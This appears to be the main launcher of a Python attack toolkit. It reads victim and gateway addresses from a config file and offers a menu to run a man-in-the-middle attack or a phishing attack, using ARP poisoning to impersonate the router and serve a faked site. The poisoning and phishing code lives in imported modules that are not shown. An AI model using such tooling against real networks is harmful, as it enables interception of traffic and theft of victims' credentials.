#! /usr/bin/python

from mitm.mitm import *
from sniffing.sniffing import *
from phishing.phishing import *
from scapy.all import *
import sys, os, time, subprocess, random
from multiprocessing import Process


websites={1: "hello_world"}
_victimIP=""
_gateIP=""
_interface=""
_myIP=""
conf_file="conf.txt"


print("\n\n[main][*] parsing configuration")
content_tmp=tuple(open(conf_file, "r").read().split("\n"))
content=[]
for l in content_tmp:
    if l != "":
        content.append(l)
for l in content:
    (var, value) = l.split("=")
    if str(var) == "_victimIP":
        _victimIP=value.replace('"', '')
    elif str(var) == "_gateIP":
        _gateIP=value.replace('"', '')
    elif str(var) == "_interface":
        _interface=value.replace('"', '')
    elif str(var) == "_myIP":
        _myIP=value.replace('"', '')


print("[main][?] interface  : {inter}".format(inter=_interface))
print("[main][?] my IP      : {ip}".format(ip=_myIP))
print("[main][?] victim IP  : {victim}".format(victim=_victimIP))
print("[main][?] gateway IP : {gate}".format(gate=_gateIP))
if _gateIP == "":
    _gateIP=get_gateway_ip()
print("What kind of attack do you want to carry out ?")
print("\t1: man in the middle")
print("\t2: phishing")
print("\t3: exiting")
choice=raw_input("> ")
if choice == "1":
    init(True)
    mitm(_interface, _victimIP, _gateIP)
elif choice == "2":
    print("[main][*] Which site do you want to fake ?")
    print("\t1: hello world")
    choice_str=raw_input("> ")
    choice=int(choice_str)
    _victimMAC=get_mac(_victimIP, _interface)
    _gateMAC=get_mac(_gateIP, _interface)
    #make the target believe that we are the router
    #should be parallelized
    p=Process(target=poison, args=[_victimMAC, _victimIP, _gateIP])
    p.start()
    sender=SiteSender(websites[choice], _victimIP, _gateIP, _victimMAC, _gateMAC)
    sender.wait()
else:
    print("[main][*] exiting...")
    sys.exit(1)
